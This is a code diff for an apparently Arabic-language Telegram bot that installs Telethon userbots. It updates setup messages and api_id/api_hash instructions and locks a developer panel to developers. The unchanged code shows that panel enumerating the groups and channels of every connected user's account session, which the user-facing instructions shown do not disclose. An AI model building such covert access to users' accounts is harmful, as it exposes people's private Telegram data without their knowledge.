@@ -489,17 +489,17 @@ async def bot_start(event):
         )
         return
 
-    # رسالة المستخدم العادي – بدون زر التنصيب
+    # المستخدم العادي – رسالة عريضة مع خيارين فقط
     buttons = [
         [Button.url("الحصول على بياناتي", "https://my.telegram.org/apps")],
         [Button.inline("كيفية جلب البيانات", b"how_to_get_data")],
-        [Button.inline("لوحة التحكم", b"dev_login")],
     ]
     await event.respond(
-        "**• لبدء إعداد Qthon تليثون 🜲**\n\n"
-        "- تحتاج معلومات حسابك\n"
-        "- افتح تطبيق البوت للبدء\n"
-        "- أكمل خطوات الإعداد المطلوبة",
+        "**• لبدء تنصيب تيليثون ڪيوجࢪام 🜲**\n"
+        "**- قم بجلب معلومات حسابك**\n"
+        "**- لبدء تنصيب إفتح تطبيق البوت**\n"
+        "**- أكمل إجراءات التنصيب المطلوبة**\n"
+        "**- لن يستغرق التنصيب الكثير من الوقت**",
         buttons=buttons,
         parse_mode='md'
     )
@@ -507,15 +507,32 @@ async def bot_start(event):
 @bot.on(events.CallbackQuery(data=b"how_to_get_data"))
 async def how_to_get_data(event):
     await event.answer(
-        "1. اذهب إلى my.telegram.org\n"
-        "2. سجل الدخول برقم هاتفك\n"
-        "3. اذهب إلى أدوات تطوير API\n"
-        "4. احصل على api_id و api_hash",
+        "🔹 **طريقة جلب بيانات API:**\n\n"
+        "1. افتح المتصفح واذهب إلى:\n"
+        "   my.telegram.org\n\n"
+        "2. أدخل رقم هاتفك الدولي\n"
+        "   مثال: +2010xxxxxxxx\n\n"
+        "3. ستستلم رمز تحقق في تيليجرام،\n"
+        "   أدخله في الموقع.\n\n"
+        "4. بعد الدخول، اختر:\n"
+        "   «API development tools»\n\n"
+        "5. املأ النموذج:\n"
+        "   - App title: أي اسم (مثلاً Qthon)\n"
+        "   - Short name: اسم قصير (مثلاً qthon)\n"
+        "   - Platform: اختر «Desktop»\n\n"
+        "6. اضغط «Create application»\n"
+        "   سيظهر لك:\n"
+        "   • api_id (رقم)\n"
+        "   • api_hash (نص طويل)\n\n"
+        "7. انسخهما واستخدمهما في موقع التنصيب.",
         alert=True
     )
 
 @bot.on(events.CallbackQuery(data=b"dev_login"))
 async def dev_login(event):
+    if not is_dev(event.sender_id):
+        await event.answer("غير مصرح", alert=True)
+        return
     if dev_access_locked and not is_dev(event.sender_id):
         await event.answer("خيارات المطور مقفلة حالياً", alert=True)
         return
@@ -629,7 +646,7 @@ async def dev_callback(event):
         for phone, client in active_clients.items():
             try:
                 dialogs = await client.get_dialogs(limit=200)
-                groups = [d for d in dialogs if d.is_group and not d.is_channel]  # مجموعات فقط
+                groups = [d for d in dialogs if d.is_group and not d.is_channel]
                 if groups:
                     found = True
                     info = user_info_cache.get(phone, {})
@@ -649,7 +666,7 @@ async def dev_callback(event):
         for phone, client in active_clients.items():
             try:
                 dialogs = await client.get_dialogs(limit=200)
-                channels = [d for d in dialogs if d.is_channel and not d.is_group]  # قنوات فقط
+                channels = [d for d in dialogs if d.is_channel and not d.is_group]
                 if channels:
                     found = True
                     info = user_info_cache.get(phone, {})
@@ -669,7 +686,6 @@ async def dev_callback(event):
     await event.answer()
 
 # ======================== موقع الويب (إنجليزي) ========================
-# (لم يطرأ تغيير على الموقع)
 @app.route('/')
 def home():
     return """<!DOCTYPE html>
